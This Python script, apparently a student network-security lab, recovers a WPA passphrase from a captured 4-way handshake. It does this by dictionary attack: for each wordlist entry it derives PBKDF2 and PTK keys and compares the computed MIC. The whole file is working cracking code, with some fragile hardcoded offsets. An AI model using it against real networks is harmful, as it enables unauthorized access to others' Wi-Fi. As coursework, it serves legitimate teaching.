#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
    Permet de lire une passphrase à partir d’un fichier (wordlist) ainsi qu'une capture pcap 
    Dérive les clef et constantes
    Calcule le MIC et si il est egal alors retourne la bonne passphrase. 

"""

__author__      = "Florian Mülhauser, Robin Cuénoud"

from scapy.all import *
from scapy.contrib.wpa_eapol import *
from binascii import a2b_hex, b2a_hex
#from pbkdf2 import pbkdf2_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib
import os 

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]



def getConstants(pcap):
    """
        Get the constant given a capture 
        return ANonce, SNonce, mic_to_test, APmac, Clientmac, ssid 
    """
    handshake = []
    # capture handshake and ssid name and mac of AP and Client
    for frame in wpa:
        # first get ssid name and mac
        # find beacon frame (type 0 (management) , subtype 8 (Beacon))
        if frame.type == 0 and frame.subtype == 8:  
            ssid = frame.info.decode("utf-8")
            APmac = a2b_hex(frame.addr2.replace(':',''))
        # find authentication frame (type 0 ,subtype 11 )
        if frame.type == 0 and frame.subtype == 11 and a2b_hex(frame.addr2.replace(':', '')) == APmac :
                # get client mac 
                Clientmac = a2b_hex(frame.addr1.replace(':', ''))  
        # 4-way handshake 
        # layer WPA_key give frame 1 and 3 and proto == 1 (protocol EAPOL) give frame 2 and 4
        if frame.haslayer(EAPOL) or frame.type == 0 and frame.subtype == 0 and frame.proto == 1:
            handshake.append(frame)
            
    # get Nonce and MIC
    if(len(handshake) != 4):
        print("bad handshake or too many handshake in pcap")
        exit()

    ANonce = handshake[0][EAPOL].nonce
    # for some reason this packet has no EAPOL layer to get nonce from (both field exist in wireshark)
    SNonce = raw(handshake[1])[65:97]
    # same as above, in wireshark it's from 129 to the end without last two bytes 
    mic_to_test = raw(handshake[3])[129:-2]
    return ANonce, SNonce, mic_to_test, APmac, Clientmac, ssid 


def crackMic(passphrases, ANonce, SNonce, mic_to_test, APmac, Clientmac, ssid ):
    
    # parameters that can't be obtained via the pcap file 
    A           = "Pairwise key expansion" #this string is used in the pseudo-random function

    B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

    data        = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000") #cf "Quelques détails importants" dans la donnée
    ssid = str.encode(ssid)

    for passPhrase in passphrases:
        passPhrase = passPhrase.replace('\n','')
        print("Testing ",passPhrase)
        #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        passPhrase = str.encode(passPhrase)
        
        pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)

        #expand pmk to obtain PTK
        ptk = customPRF512(pmk,str.encode(A),B)

        #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
        mic = hmac.new(ptk[0:16],data,hashlib.sha1)

        # if egal mic it's found 
        if mic.hexdigest()[:-8] == mic_to_test.hex():
            return passPhrase
    # if no match        
    return "passphrase not found "

if __name__ == "__main__":
    print("Reading pcap...")
    # Read capture file -- it contains beacon, authentication, associacion, handshake and data
    wpa=rdpcap("files/wpa_handshake.cap") 
    print("getting constants...")
    ANonce, SNonce, mic_to_test, APmac, Clientmac, ssid = getConstants(wpa)

    passphrases = open('files/passphrases.txt') 
    
    result = crackMic(passphrases, ANonce, SNonce, mic_to_test, APmac, Clientmac, ssid)

    if(result != "passphrase not found "):
        print("Passphrase found it's : ",result)
    else:
        print(result)





